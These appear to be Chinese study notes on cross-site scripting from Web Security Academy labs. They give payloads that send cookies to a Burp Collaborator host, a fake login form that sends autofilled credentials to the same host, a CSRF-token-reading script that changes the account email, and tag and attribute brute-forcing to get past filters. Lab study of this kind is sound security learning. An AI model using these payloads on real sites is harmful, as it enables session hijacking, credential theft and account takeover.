XSS通常用alert()来检测

用这两种来利用：
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>

httponly可以隐藏cookie（Many applications hide their cookies from JavaScript using the `HttpOnly` flag.）

burpsuite的Collaborator可以生成xss的存储地



## 反射型

### 盗取cookie：

```
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

### （在评论中）创造输入框，获取自动填充的内容：

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST', 
mode: 'no-cors', 
body:username.value+':'+this.value
});">
```

### CSRF：自动改邮箱（条件：邮箱更改不需要验证）

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```



```
<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() {     var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];     var changeReq = new XMLHttpRequest();     changeReq.open('post', '/my-account/change-email', true);     changeReq.send('csrf='+token+'&email=test@test.com') }; </script>
```



```
/?search=<img src=1 onerror=print()>：显示标签被拦截
/?search=<§§>：爆破标签，结果body可以用
/?search=<body%20§§=1>：爆破属性。%20是空格。属性="xxx"，用1为简化
/?search='<body onresize="print(1)"></body>：在判断允许的标签是body，属性是onresize后，执行反射型XSS。'是闭合结果显示时候的引号。onresize：浏览器框图大小改变时触发
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>：发短信诱导改变iframe大小，导致其向靶场发送请求，最终print
```





| 输入 | URL编码后 |
| ---- | --------- |
| %3C  | <         |
| %3D  | =         |
| %3E  | >         |
| %28  | (         |
| %29  | )         |
| %20  | 空格      |
| %27  | '         |
| %22  | "         |

